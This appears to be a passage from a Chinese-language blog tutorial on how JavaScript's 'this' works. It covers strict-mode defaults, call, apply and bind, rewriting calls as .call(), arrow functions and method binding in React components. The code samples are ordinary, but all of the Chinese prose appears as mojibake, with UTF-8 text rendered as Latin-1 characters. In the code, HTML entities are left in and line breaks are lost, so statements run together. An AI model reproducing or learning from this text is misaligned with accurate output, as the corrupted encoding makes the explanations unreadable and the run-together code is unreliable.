åªè¦è¨˜å¾—æˆ‘å‰é¢è·Ÿä½ èªªçš„ï¼šã€Œè„«é›¢äº†ç‰©ä»¶ï¼Œthis çš„å€¼å°±æ²’ä»€éº¼æ„ç¾©ã€ã€‚
åœ¨é€™ç¨®å¾ˆæ²’æ„ç¾©çš„æƒ…æ³ä¸‹ï¼Œthis çš„å€¼åœ¨ç€è¦½å™¨åº•ä¸‹å°±æœƒæ˜¯windowï¼Œåœ¨ node.js åº•ä¸‹æœƒæ˜¯globalï¼Œå¦‚æœæ˜¯åœ¨åš´æ ¼æ¨¡å¼ï¼Œthis çš„å€¼å°±æœƒæ˜¯undefinedã€‚
é€™å€‹è¦å‰‡æ‡‰è©²æ»¿å¥½è¨˜çš„ï¼Œå¹«å¤§å®¶é‡æ–°æ•´ç†ä¸€ä¸‹ï¼š

åš´æ ¼æ¨¡å¼åº•ä¸‹å°±éƒ½æ˜¯undefined
éåš´æ ¼æ¨¡å¼ï¼Œç€è¦½å™¨åº•ä¸‹æ˜¯window
éåš´æ ¼æ¨¡å¼ï¼Œnode.js åº•ä¸‹æ˜¯global

é€™å€‹å°±æ˜¯ä½ åœ¨å…¶ä»–æ–‡ç« çœ‹åˆ°çš„ã€Œé è¨­ç¶å®šã€ï¼Œä½†æˆ‘åœ¨é€™ç¯‡ä¸æ‰“ç®—ç”¨ä»»ä½•å°ˆæœ‰åè©å»è«‡ thisã€‚æˆ‘èªç‚ºä¸ç”¨é€™äº›åè©ä¹Ÿä¸æœƒå¦¨ç¤™ä½ çš„ç†è§£ï¼Œç”šè‡³é‚„æœ‰å¯èƒ½è®“ä½ æ›´å¥½ç†è§£ã€‚æˆ‘ä¹Ÿä¸æ˜¯èªªå°ˆæœ‰åè©ä¸é‡è¦ï¼Œæ˜¯èªªå¯ä»¥å…ˆæŠŠæ¦‚å¿µå­¸èµ·ä¾†ï¼Œå†å›éé ­ä¾†è£œå°ˆæœ‰åè©ã€‚
ä¸€ä½†è„«é›¢äº†ç‰©ä»¶ï¼Œthis çš„å€¼å°±æ²’ä»€éº¼æ„ç¾©ï¼Œåœ¨æ²’æ„ç¾©çš„æƒ…æ³åº•ä¸‹å°±æœƒæœ‰å€‹é è¨­å€¼ï¼Œè€Œé è¨­å€¼ä¹Ÿå¾ˆå¥½è¨˜ï¼Œåš´æ ¼æ¨¡å¼å°±æ˜¯undefinedï¼Œéåš´æ ¼æ¨¡å¼åº•ä¸‹å°±æ˜¯å…¨åŸŸç‰©ä»¶ã€‚
æ›´æ”¹ this çš„å€¼åƒ…ç®¡ this å¯èƒ½æœ‰é è¨­çš„å€¼ï¼Œä½†æˆ‘å€‘å¯ä»¥é€éä¸€äº›æ–¹æ³•ä¾†æ”¹å®ƒã€‚é€™æ”¹çš„æ–¹æ³•ä¹Ÿå¾ˆç°¡å–®ï¼Œä¸€å…±æœ‰ä¸‰ç¨®ã€‚
å‰å…©ç¨®è¶…ç´šé¡ä¼¼ï¼Œå«åšcallè·Ÿapplyï¼Œé€™å…©ç¨®éƒ½æ˜¯èƒ½å¤ å‘¼å« fucntion çš„å‡½å¼ï¼Œæˆ‘èˆ‰ä¸€å€‹ä¾‹å­çµ¦ä½ çœ‹æ¯”è¼ƒå¥½æ‡‚ï¼š
&#x27;use strict&#x27;;function hello(a, b)&#123;  console.log(this, a, b)&#125;  hello(1, 2) // undefined 1 2hello.call(undefined, 1, 2) // undefined 1 2hello.apply(undefined, [1, 2]) // undefined 1 2

æˆ‘å€‘æœ‰ä¸€å€‹å«åš hello çš„å‡½å¼ï¼Œæœƒ log å‡º this çš„å€¼ä»¥åŠå…©å€‹åƒæ•¸ã€‚åœ¨æˆ‘å€‘å‘¼å«hello(1, 2)çš„æ™‚å€™ï¼Œå› ç‚ºæ˜¯åš´æ ¼æ¨¡å¼æ‰€ä»¥ this æ˜¯ undefinedï¼Œè€Œ a è·Ÿ b å°±æ˜¯ 1 è·Ÿ 2ã€‚
ç•¶æˆ‘å€‘å‘¼å«hello.call(undefined, 1, 2)çš„æ™‚å€™ï¼Œæˆ‘å€‘å…ˆå¿½ç•¥ç¬¬ä¸€å€‹åƒæ•¸ä¸è«‡ï¼Œä½ å¯ä»¥ç™¼ç¾ä»–å…¶å¯¦è·Ÿhello(1, 2)æ˜¯ä¸€æ¨£çš„ã€‚
è€Œ apply çš„å·®åˆ¥åªåœ¨æ–¼ä»–è¦å‚³é€²å»çš„åƒæ•¸æ˜¯ä¸€å€‹ arrayï¼Œæ‰€ä»¥ä¸Šé¢é€™ä¸‰ç¨®å‘¼å« function çš„æ–¹å¼æ˜¯ç­‰åƒ¹çš„ï¼Œä¸€æ¨¡ä¸€æ¨£ã€‚é™¤äº†ç›´æ¥å‘¼å« function ä»¥å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨ call æˆ–æ˜¯ apply å»å‘¼å«ï¼Œå·®åˆ¥åœ¨æ–¼å‚³åƒæ•¸çš„æ–¹å¼ä¸åŒã€‚
call è·Ÿ apply çš„å·®åˆ¥å°±æ˜¯é€™éº¼ç°¡å–®ï¼Œä¸€å€‹è·Ÿå¹³å¸¸å‘¼å« function ä¸€æ¨£ï¼Œä¸€å€‹ç”¨ array åŒ…èµ·ä¾†ã€‚
é‚£æˆ‘å€‘å‰›å‰›å¿½ç•¥çš„ç¬¬ä¸€å€‹åƒæ•¸åˆ°åº•æ˜¯ä»€éº¼å‘¢ï¼Ÿ
ä½ å¯èƒ½å·²ç¶“çŒœåˆ°äº†ï¼Œå°±æ˜¯thisçš„å€¼ï¼
&#x27;use strict&#x27;;function hello(a, b)&#123;  console.log(this, a, b)&#125;  hello.call(&#x27;yo&#x27;, 1, 2) // yo 1 2hello.apply(&#x27;hihihi&#x27;, [1, 2]) // hihihi 1 2

å°±æ˜¯å¦‚æ­¤ç°¡å–®ï¼Œä½ ç¬¬ä¸€å€‹åƒæ•¸å‚³ä»€éº¼ï¼Œè£¡é¢ this çš„å€¼å°±æœƒæ˜¯ä»€éº¼ã€‚å„˜ç®¡åŸæœ¬å·²ç¶“æœ‰ thisï¼Œä¹Ÿä¾ç„¶æœƒè¢«é€™ç¨®æ–¹æ³•çµ¦è¦†è“‹æ‰ï¼š
class Car &#123;  hello() &#123;    console.log(this)  &#125;&#125;  const myCar = new Car()myCar.hello() // myCar instancemyCar.hello.call(&#x27;yaaaa&#x27;) // yaaaa

åŸæœ¬ this çš„å€¼æ‡‰è©²è¦æ˜¯ myCar é€™å€‹ instanceï¼Œå¯æ˜¯å»è¢«æˆ‘å€‘åœ¨ä½¿ç”¨ call æ™‚å‚³é€²å»çš„åƒæ•¸çµ¦è¦†è“‹æ‰äº†ã€‚
é™¤äº†ä»¥ä¸Šå…©ç¨®ä»¥å¤–ï¼Œé‚„æœ‰æœ€å¾Œä¸€ç¨®å¯ä»¥æ”¹è®Š this çš„æ–¹æ³•ï¼šbindã€‚
&#x27;use strict&#x27;;function hello() &#123;  console.log(this)&#125;  const myHello = hello.bind(&#x27;my&#x27;)myHello() // my

bind æœƒå›å‚³ä¸€å€‹æ–°çš„ functionï¼Œåœ¨é€™é‚Šæˆ‘å€‘æŠŠ hello é€™å€‹ function ç”¨ my ä¾†ç¶å®šï¼Œæ‰€ä»¥æœ€å¾Œå‘¼å« myHello() æ™‚æœƒè¼¸å‡º myã€‚
ä»¥ä¸Šå°±æ˜¯ä¸‰ç¨®å¯ä»¥æ”¹è®Š this çš„å€¼çš„æ–¹æ³•ã€‚ä½ å¯èƒ½æœƒå¥½å¥‡å¦‚æœæˆ‘å€‘æŠŠ call è·Ÿ bind åŒæ™‚ç”¨æœƒæ€æ¨£ï¼š
&#x27;use strict&#x27;;function hello() &#123;  console.log(this)&#125;  const myHello = hello.bind(&#x27;my&#x27;)myHello.call(&#x27;call&#x27;) // my

ç­”æ¡ˆæ˜¯ä¸æœƒæ”¹è®Šï¼Œä¸€ä½† bind äº†ä»¥å¾Œå€¼å°±ä¸æœƒæ”¹è®Šäº†ã€‚
é€™é‚Šé‚„è¦ç‰¹åˆ¥æé†’çš„ä¸€é»æ˜¯åœ¨éåš´æ ¼æ¨¡å¼åº•ä¸‹ï¼Œç„¡è«–æ˜¯ç”¨ callã€apply é‚„æ˜¯ bindï¼Œä½ å‚³é€²å»çš„å¦‚æœæ˜¯ primitive éƒ½æœƒè¢«è½‰æˆ objectï¼Œèˆ‰ä¾‹ä¾†èªªï¼š
function hello() &#123;  console.log(this)&#125;  hello.call(123) // [Number: 123]const myHello = hello.bind(&#x27;my&#x27;)myHello() // [String: &#x27;my&#x27;]

å¹«å¤§å®¶åšå€‹ä¸­å ´ç¸½çµï¼š

åœ¨ç‰©ä»¶ä»¥å¤–çš„ this åŸºæœ¬ä¸Šæ²’æœ‰ä»»ä½•æ„ç¾©ï¼Œç¡¬è¦è¼¸å‡ºçš„è©±æœƒçµ¦å€‹é è¨­å€¼
å¯ä»¥ç”¨ callã€apply èˆ‡ bind æ”¹è®Š this çš„å€¼

ç‰©ä»¶ä¸­çš„ thisæœ€å‰é¢æˆ‘å€‘ç¤ºç¯„äº†åœ¨ç‰©ä»¶å°å‘ class è£¡é¢çš„ thisï¼Œä½†åœ¨ JavaScript è£¡é¢é‚„æœ‰å¦å¤–ä¸€ç¨®æ–¹å¼ä¹Ÿæ˜¯ç‰©ä»¶ï¼š
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;&#125;  obj.hello() // 1

é€™ç¨®è·Ÿä¸€é–‹å§‹çš„ç‰©ä»¶å°å‘ç¯„ä¾‹ä¸å¤ªä¸€æ¨£ï¼Œé€™å€‹ç¯„ä¾‹æ˜¯ç›´æ¥å‰µé€ äº†ä¸€å€‹ç‰©ä»¶è€Œæ²’æœ‰é€é classï¼Œæ‰€ä»¥ä½ ä¹Ÿä¸æœƒçœ‹åˆ° new é€™å€‹é—œéµå­—çš„å­˜åœ¨ã€‚
å†ç¹¼çºŒå¾€ä¸‹è¬›ä¹‹å‰ï¼Œè¦å¤§å®¶å…ˆè¨˜ä½ä¸€ä»¶äº‹æƒ…ï¼š

this çš„å€¼è·Ÿä½œç”¨åŸŸè·Ÿç¨‹å¼ç¢¼çš„ä½ç½®åœ¨å“ªè£¡å®Œå…¨ç„¡é—œï¼Œåªè·Ÿã€Œä½ å¦‚ä½•å‘¼å«ã€æœ‰é—œ

é€™å€‹æ©Ÿåˆ¶æ°å·§è·Ÿä½œç”¨åŸŸç›¸åï¼Œä¸ç¢ºå®šæˆ‘åœ¨èªªä»€éº¼çš„å¯ä»¥å…ˆçœ‹é€™ç¯‡ï¼šæ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ï¼šè«‡ JS ä¸­çš„ä½œç”¨åŸŸèˆ‡ Closureã€‚
èˆ‰å€‹ç°¡å–®çš„ä¾‹å­ä¾†å¹«å¤§å®¶è¤‡ç¿’ä¸€ä¸‹ä½œç”¨åŸŸï¼š
var a = 10function test()&#123;  console.log(a)&#125;  const obj = &#123;  a: &#x27;ojb&#x27;,  hello: function() &#123;    test() // 10  &#125;,  hello2: function() &#123;    var a = 200    test() // 10  &#125;&#125;  test() // 10obj.hello()obj.hello2()

ç„¡è«–æˆ‘åœ¨å“ªè£¡ï¼Œç„¡è«–æˆ‘æ€éº¼å‘¼å«testé€™å€‹ functionï¼Œä»–å°å‡ºä¾†çš„ a æ°¸é éƒ½æœƒæ˜¯å…¨åŸŸè®Šæ•¸çš„é‚£å€‹ aï¼Œå› ç‚ºä½œç”¨åŸŸå°±æ˜¯é€™æ¨£é‹ä½œï¼Œtest åœ¨è‡ªå·±çš„ä½œç”¨åŸŸè£¡é¢æ‰¾ä¸åˆ° a æ–¼æ˜¯å¾€ä¸Šä¸€å±¤æ‰¾ï¼Œè€Œä¸Šä¸€å±¤å°±æ˜¯ global scopeï¼Œé€™è·Ÿä½ åœ¨å“ªè£¡å‘¼å« test ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ã€‚test é€™å€‹ function åœ¨ã€Œå®šç¾©ã€çš„æ™‚å€™å°±æŠŠ scope çµ¦æ±ºå®šå¥½äº†ã€‚
ä½† this å»æ˜¯å®Œå…¨ç›¸åï¼Œthis çš„å€¼æœƒæ ¹æ“šä½ æ€éº¼å‘¼å«å®ƒè€Œè®Šå¾—ä¸ä¸€æ¨£ï¼Œé‚„è¨˜å¾—æˆ‘å€‘å‰›è¬›éçš„ callã€apply è·Ÿ bind å—ï¼Ÿé€™å°±æ˜¯å…¶ä¸­ä¸€å€‹ç¯„ä¾‹ï¼Œä½ å¯ä»¥ç”¨ä¸åŒçš„æ–¹å¼å»å‘¼å« functionï¼Œè®“ this çš„å€¼è®Šå¾—ä¸åŒã€‚
æ‰€ä»¥ä½ è¦å¾ˆæ¸…æ¥šçŸ¥é“é€™æ˜¯å…©ç¨®å®Œå…¨ä¸åŒçš„é‹è¡Œæ¨¡å¼ï¼Œä¸€å€‹æ˜¯éœæ…‹ï¼ˆä½œç”¨åŸŸï¼‰ã€ä¸€å€‹æ˜¯å‹•æ…‹ï¼ˆthisï¼‰ã€‚è¦çœ‹ä½œç”¨åŸŸï¼Œå°±çœ‹é€™å€‹å‡½å¼åœ¨ç¨‹å¼ç¢¼çš„ã€Œå“ªè£¡ã€ï¼›è¦çœ‹ thisï¼Œå°±çœ‹é€™å€‹å‡½å¼ã€Œæ€éº½ã€è¢«å‘¼å«ã€‚
èˆ‰ä¸€å€‹æœ€å¸¸è¦‹çš„ç¯„ä¾‹ï¼š
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;&#125;  obj.hello() // 1const hey = obj.hellohey() // undefined

æ˜æ˜å°±æ˜¯åŒä¸€å€‹å‡½å¼ï¼Œæ€éº¼ç¬¬ä¸€æ¬¡å‘¼å«æ™‚ this.value æ˜¯ 1ï¼Œç¬¬äºŒæ¬¡å‘¼å«æ™‚å°±è®Šæˆ undefined äº†ï¼Ÿ
è¨˜ä½æˆ‘å‰›èªªçš„è©±ï¼šã€Œè¦çœ‹ thisï¼Œå°±çœ‹é€™å€‹å‡½å¼ã€æ€éº½ã€è¢«å‘¼å«ã€ã€‚
å†ç¹¼çºŒå¾€ä¸‹è¬›ä¹‹å‰ï¼Œå…ˆæ•™å¤§å®¶ä¸€å€‹æœ€é‡è¦çš„å°æ’‡æ­¥ï¼Œæ˜¯æˆ‘å¾this çš„å€¼åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿä¸€æ¬¡è¯´æ¸…æ¥šå­¸ä¾†çš„ï¼Œæ˜¯ä¸€å€‹å¾ˆæ–¹ä¾¿çš„æ–¹æ³•ã€‚
å…¶å¯¦æˆ‘å€‘å¯ä»¥æŠŠæ‰€æœ‰çš„ function callï¼Œéƒ½è½‰æˆåˆ©ç”¨callçš„å½¢å¼ä¾†çœ‹ï¼Œä»¥ä¸Šé¢é‚£å€‹ä¾‹å­ä¾†èªªï¼Œæœƒæ˜¯é€™æ¨£ï¼š
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;&#125;  obj.hello() // 1obj.hello.call(obj) // è½‰æˆ callconst hey = obj.hellohey() // undefinedhey.call() // è½‰æˆ call

è€Œè¦å‰‡å°±æ˜¯ä½ åœ¨å‘¼å« function ä»¥å‰æ˜¯ä»€éº¼æ±è¥¿ï¼Œä½ å°±æŠŠå®ƒæ”¾åˆ°å¾Œé¢å»ã€‚æ‰€ä»¥obj.hello()å°±è®Šæˆäº†obj.hello.call(obj)ï¼Œhey()å‰é¢æ²’æœ‰æ±è¥¿ï¼Œæ‰€ä»¥å°±è®Šæˆäº†hey.call()ã€‚
è½‰æˆé€™æ¨£å­çš„å½¢å¼ä¹‹å¾Œï¼Œé‚„è¨˜å¾— call çš„ç¬¬ä¸€å€‹åƒæ•¸å°±æ˜¯ this å—ï¼Ÿæ‰€ä»¥ä½ å°±èƒ½ç«‹åˆ»çŸ¥é“ this çš„å€¼æ˜¯ä»€éº¼äº†ï¼
èˆ‰ä¸€å€‹æ›´è¤‡é›œçš„ä¾‹å­ï¼š
const obj = &#123;  value: 1,  hello: function() &#123;    console.log(this.value)  &#125;,  inner: &#123;    value: 2,    hello: function() &#123;      console.log(this.value)    &#125;  &#125;&#125;  const obj2 = obj.innerconst hello = obj.inner.helloobj.inner.hello()obj2.hello()hello()

ä½ å¯ä»¥ä¸è¦å¾€ä¸‹æ‹‰ï¼Œå…ˆæƒ³ä¸€ä¸‹é‚£ä¸‰å€‹ function æœƒå„è‡ªå°å‡ºä»€éº¼å€¼ã€‚
æ¥è‘—æˆ‘è¦å…¬å¸ƒè§£ç­”äº†ï¼Œåªè¦è½‰æˆæˆ‘å€‘ä¸Šé¢è¬›çš„é‚£ç¨®å½¢å¼å°±å¥½ï¼š
obj.inner.hello() // obj.inner.hello.call(obj.inner) =&gt; 2obj2.hello() // obj2.hello.call(obj2) =&gt; 2hello() // hello.call() =&gt; undefined

ç‰¹åˆ¥è¬›ä¸€ä¸‹æœ€å¾Œä¸€å€‹ hello å› ç‚ºæ²’æœ‰å‚³æ±è¥¿é€²å»ï¼Œæ‰€ä»¥æ˜¯é è¨­ç¶å®šï¼Œåœ¨éåš´æ ¼æ¨¡å¼åº•ä¸‹æ˜¯ windowï¼Œæ‰€ä»¥æœƒ log å‡ºwindow.valueä¹Ÿå°±æ˜¯ undefinedã€‚
åªè¦ä½ æŠŠ function çš„å‘¼å«è½‰æˆç”¨ call çš„é€™ç¨®å½¢å¼ï¼Œå°±å¾ˆå®¹æ˜“çœ‹å‡ºä¾† this çš„å€¼æ˜¯ä»€éº¼ã€‚
é€™ä¹Ÿæ˜¯æˆ‘å‰é¢ä¸€ç›´åœ¨æçš„ï¼šã€Œè¦çœ‹ thisï¼Œå°±çœ‹é€™å€‹å‡½å¼ã€æ€éº½ã€è¢«å‘¼å«ã€ï¼Œè€Œä½ è¦çœ‹æ€éº¼è¢«å‘¼å«çš„è©±ï¼Œå°±è½‰æˆ call çš„å½¢å¼å°±è¡Œäº†ã€‚
å­¸åˆ°é€™é‚Šï¼Œå…¶å¯¦ä½ çœ‹è¦‹ä¹æˆèˆ‡ this ç›¸é—œçš„é¡Œç›®ä½ éƒ½æœƒè§£äº†ï¼Œä¸ä¿¡çš„è©±æˆ‘å€‘ä¾†è©¦è©¦çœ‹ï¼ˆç‚ºäº†å¯è®€æ€§æ²’æœ‰é˜²é›·ç©ºè¡Œï¼Œæ‰€ä»¥è«‹è‡ªè¡Œæ‹‰åˆ°ç¨‹å¼ç¢¼å°±å¥½ï¼Œå†å¾€ä¸‹æ‹‰å°±æœƒæ˜¯è§£ç­”äº†ï¼‰ï¼š
function hello() &#123;  console.log(this)&#125;  var a = &#123; value: 1, hello &#125;var b = &#123; value: 2, hello &#125;hello()a.hello()b.hello.apply(a)

åªè¦æŒ‰ç…§æˆ‘å€‘ä¹‹å‰èªªçš„ï¼Œç”¨ call ä¾†è½‰æ›ä¸€ä¸‹å½¢å¼å°±å¥½ï¼š
hello() // hello.call() =&gt; windowï¼ˆç€è¦½å™¨éåš´æ ¼æ¨¡å¼ï¼‰a.hello() // a.hello.call(a) =&gt; ab.hello.apply(a) =&gt; ç›´æ¥ç”¨ applyï¼Œæ‰€ä»¥å°±æ˜¯ a

å†ä¾†ä¸€é¡Œæ¯”è¼ƒä¸ä¸€æ¨£çš„ï¼Œè¦çœ‹ä»”ç´°å›‰ï¼ˆå‡è¨­åœ¨ç€è¦½å™¨åº•ä¸‹è·‘ï¼Œéåš´æ ¼æ¨¡å¼ï¼‰ï¼š
var x = 10var obj = &#123;  x: 20,  fn: function() &#123;    var test = function() &#123;      console.log(this.x)    &#125;    test()  &#125;&#125;  obj.fn()

é€™é¡Œçš„è©±å¦‚æœä½ æéŒ¯ï¼Œä¸€å®šæ˜¯ä½ å¿˜è¨˜äº†æˆ‘å€‘æœ€é‡è¦çš„ä¸€å¥è©±ï¼š

è¦çœ‹ thisï¼Œå°±çœ‹é€™å€‹å‡½å¼ã€Œæ€éº½ã€è¢«å‘¼å«

æˆ‘å€‘æ€éº¼å‘¼å« test çš„ï¼Ÿtest()ï¼Œæ‰€ä»¥å°±æ˜¯test.call()å°±æ˜¯é è¨­ç¶å®šï¼Œthisçš„å€¼å°±æœƒæ˜¯ windowï¼Œæ‰€ä»¥this.xæœƒæ˜¯ 10ï¼Œå› ç‚ºåœ¨ç¬¬ä¸€è¡Œå®£å‘Šäº†ä¸€å€‹å…¨åŸŸè®Šæ•¸ x &#x3D; 10ã€‚
å¯«åˆ°é€™è£¡ï¼Œå†ä¾†å¹«å¤§å®¶åšå€‹å›é¡§ï¼Œé¿å…å¤§å®¶å¿˜è¨˜å‰é¢åœ¨è¬›ä»€éº¼ï¼š

è„«é›¢ç‰©ä»¶çš„ this åŸºæœ¬ä¸Šæ²’æœ‰ä»»ä½•æ„ç¾©
æ²’æœ‰æ„ç¾©çš„ this æœƒæ ¹æ“šåš´æ ¼æ¨¡å¼ä»¥åŠç’°å¢ƒçµ¦ä¸€å€‹é è¨­å€¼
åš´æ ¼æ¨¡å¼åº•ä¸‹é è¨­å°±æ˜¯ undefinedï¼Œéåš´æ ¼æ¨¡å¼åœ¨ç€è¦½å™¨åº•ä¸‹é è¨­å€¼æ˜¯ window
å¯ä»¥ç”¨ callã€apply èˆ‡ bind æ”¹è®Š this çš„å€¼
è¦çœ‹ thisï¼Œå°±çœ‹é€™å€‹å‡½å¼ã€Œæ€éº½ã€è¢«å‘¼å«
å¯ä»¥æŠŠ a.b.c.hello() çœ‹æˆ a.b.c.hello.call(a.b.c)ï¼Œä»¥æ­¤é¡æ¨ï¼Œå°±èƒ½è¼•é¬†æ‰¾å‡º this çš„å€¼

ä¸åˆç¾¤çš„ç®­é ­å‡½å¼åŸæœ¬æœ‰é—œ this çš„éƒ¨åˆ†æ‡‰è©²è¬›åˆ°ä¸Šé¢å°±è¦çµæŸäº†ï¼Œä½† ES6 æ–°å¢çš„ç®­é ­å‡½å¼å»æœ‰ä¸å¤ªä¸€æ¨£çš„é‹ä½œæ–¹å¼ã€‚å®ƒæœ¬èº«ä¸¦æ²’æœ‰ thisï¼Œæ‰€ä»¥ã€Œåœ¨å®£å‘Šå®ƒçš„åœ°æ–¹çš„ this æ˜¯ä»€éº¼ï¼Œå®ƒçš„ this å°±æ˜¯ä»€éº¼ã€ï¼Œå¥½ï¼Œæˆ‘çŸ¥é“é€™è½èµ·ä¾†è¶…é›£æ‡‚ï¼Œæˆ‘å€‘ä¾†çœ‹å€‹ç¯„ä¾‹ï¼š
const obj = &#123;  x: 1,  hello: function()&#123;    // é€™é‚Šå°å‡ºä¾†çš„ this æ˜¯ä»€éº¼ï¼Œtest çš„ this å°±æ˜¯ä»€éº¼    // å°±æ˜¯æˆ‘èªªçš„ï¼š    // åœ¨å®£å‘Šå®ƒçš„åœ°æ–¹çš„ this æ˜¯ä»€éº¼ï¼Œtest çš„ this å°±æ˜¯ä»€éº¼    console.log(this)         const test = () =&gt; &#123;      console.log(this.x)    &#125;    test()  &#125;&#125;  obj.hello() // 1const hello = obj.hellohello() // undefined

åœ¨ç¬¬äº”è¡Œæˆ‘å€‘åœ¨ hello é€™å€‹ function è£¡é¢å®£å‘Šäº† test é€™å€‹ç®­é ­å‡½å¼ï¼Œæ‰€ä»¥ hello çš„ this æ˜¯ä»€éº¼ï¼Œtest çš„ this å°±æ˜¯ä»€éº¼ã€‚
æ‰€ä»¥ç•¶æˆ‘å€‘å‘¼å«obj.hello()æ™‚ï¼Œtest çš„ this å°±æœƒæ˜¯ objï¼›hello()çš„æ™‚å€™ test çš„ this å°±æœƒæ˜¯å…¨åŸŸç‰©ä»¶ã€‚é€™è¦å‰‡å…¶å¯¦éƒ½è·Ÿä¹‹å‰ä¸€æ¨£ï¼Œå·®åˆ¥åªæœ‰åœ¨æ–¼èªªç®­é ­å‡½å¼çš„ this ä¸æ˜¯è‡ªå·±æ±ºå®šçš„ï¼Œè€Œæ˜¯å–æ±ºæ–¼åœ¨å®£å‘Šæ™‚é‚£å€‹åœ°æ–¹çš„ thisã€‚
å¦‚æœä½ æƒ³çœ‹æ›´è¤‡é›œçš„ç¯„ä¾‹ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ï¼šéµäººè³½ï¼šç®­é ­å‡½å¼ (Arrow functions)
ã€‚
å¯¦éš›æ‡‰ç”¨ï¼šReactä½ æœ‰å¯«é React çš„è©±ï¼Œå°±æœƒçŸ¥é“è£¡é¢å…¶å¯¦æœ‰äº›æ¦‚å¿µä»Šå¤©çš„æ•™å­¸å¯ä»¥æ´¾ä¸Šç”¨å ´ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘å¿…é ˆåœ¨ constructor è£¡é¢å…ˆæŠŠä¸€äº› method çµ¦ bind å¥½ï¼Œä½ æœ‰æƒ³éæ˜¯ç‚ºä»€éº¼å—ï¼Ÿ
å…ˆä¾†çœ‹çœ‹å¦‚æœæ²’æœ‰ bind çš„è©±æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼š
class App extends React.Component &#123;  onClick() &#123;    console.log(this, &#x27;click&#x27;)  &#125;  render() &#123;    return &lt;button onClick=&#123;this.onClick&#125;&gt;click&lt;/button&gt;  &#125;&#125;

æœ€å¾Œ log å‡ºä¾†çš„å€¼æœƒæ˜¯ undefinedï¼Œç‚ºä»€éº¼ï¼Ÿé€™ç´°ç¯€å°±è¦çœ‹ React çš„åŸå§‹ç¢¼äº†ï¼Œåªæœ‰ React çŸ¥é“å¯¦éš›ä¸Šåœ¨ call æˆ‘å€‘å‚³ä¸‹å»çš„ onClick å‡½å¼æ™‚æ˜¯æ€éº¼å‘¼å«çš„ã€‚
æ‰€ä»¥ç‚ºä»€éº¼è¦ bindï¼Ÿç‚ºäº†ç¢ºä¿æˆ‘å€‘åœ¨onClickè£¡é¢æ‹¿åˆ°çš„ this æ°¸é éƒ½æ˜¯é€™å€‹ instance æœ¬èº«ã€‚
class App extends React.Component &#123;  constructor() &#123;    super()       // æ‰€ä»¥ç•¶ä½ æŠŠ this.onClick å‚³ä¸‹å»æ™‚ï¼Œå°±å·²ç¶“ç¶å®šå¥½äº† this    // è€Œé€™é‚Šçš„ this å°±æ˜¯é€™å€‹ component    this.onClick = this.onClick.bind(this)  &#125;  onClick() &#123;    console.log(this, &#x27;click&#x27;)  &#125;  render() &#123;    return &lt;button onClick=&#123;this.onClick&#125;&gt;click&lt;/button&gt;  &#125;&#125;

é‚„æœ‰å¦å¤–ä¸€ç¨®æ–¹å¼æ˜¯ç”¨ç®­é ­å‡½å¼ï¼š
class App extends React.Component &#123;  render() &#123;    return &lt;button onClick=&#123;() =&gt; &#123;    	console.log(this)    &#125;&#125;&gt;click&lt;/button&gt;  &#125;&#125;

ç‚ºä»€éº¼ç®­é ­å‡½å¼ä¹Ÿå¯ä»¥ï¼Ÿå› ç‚ºæˆ‘å€‘å‰é¢æéï¼Œã€Œåœ¨å®£å‘Šå®ƒçš„åœ°æ–¹çš„ this æ˜¯ä»€éº¼ï¼Œå®ƒçš„ this å°±æ˜¯ä»€éº¼ã€ï¼Œæ‰€ä»¥é€™é‚Š log å‡ºä¾†çš„ this å°±æœƒæ˜¯ render é€™å€‹ function çš„ thisï¼Œè€Œ render çš„ this å°±æ˜¯é€™å€‹ componentã€‚
å¦‚æœä½ æœ‰é»å¿˜è¨˜äº†ï¼Œå¯ä»¥æŠŠæ–‡ç« æ‹‰åˆ°æœ€ä¸Šé¢å»ï¼Œå› ç‚ºæœ€ä¸Šé¢æˆ‘å€‘å°±å·²ç¶“æéé€™äº›äº†ã€‚
ç¸½çµé—œæ–¼è¬›è§£ this çš„æ–‡ç« ï¼Œæˆ‘è‡³å°‘çœ‹éåå¹¾äºŒåç¯‡ï¼Œæ¯”è¼ƒå¸¸è¦‹çš„å°±æ˜¯è¬›å¹¾ç¨®ä¸åŒçš„ç¶å®šæ–¹æ³•ï¼Œä»¥åŠåœ¨å“ªäº›æ™‚å€™æœƒç”¨å“ªä¸€ç¨®ç¶å®šã€‚ä½†é€™äº›æˆ‘åœ¨é€™ç¯‡æ–‡ç« è£¡éƒ½æ²’æœ‰æï¼Œå› ç‚ºæˆ‘èªç‚ºä¸å½±éŸ¿ç†è§£ï¼ˆä½†æœ€å¥½ä¹‹å¾Œèƒ½å¤ è‡ªå·±å»è£œè¶³ç›¸é—œåè©ï¼‰ã€‚
æˆ‘ä¹Ÿæ›¾ç¶“è¿·æƒ˜éï¼Œæ›¾ç¶“è¢« this æå¾—å¾ˆæ··äº‚ï¼Œå‰é™£å­å› ç‚ºæ•™å­¸çš„ç·£æ•…ä¸å¾—ä¸æŠŠ this ææ‡‚ï¼Œè€Œæˆ‘ä¹Ÿç¢ºå¯¦æ¯”ä»¥å‰ç†è§£å¾ˆå¤šäº†ã€‚å¾æˆ‘çš„ç¶“é©—çœ‹ä¾†ï¼Œæˆ‘èªç‚º this ä¹‹æ‰€ä»¥è¤‡é›œï¼ŒåŸå› ä¹‹ä¸€å°±æ˜¯ï¼šã€Œåœ¨ç‰©ä»¶ä»¥å¤–çš„åœ°æ–¹ä¹Ÿå¯ä»¥ç”¨ thisã€ï¼Œæ‰€ä»¥æˆ‘æ‰ä¸€å†å¼·èª¿æˆ‘èªç‚ºç‰©ä»¶å¤–çš„ this æ˜¯æ²’æ„ç¾©çš„ã€‚
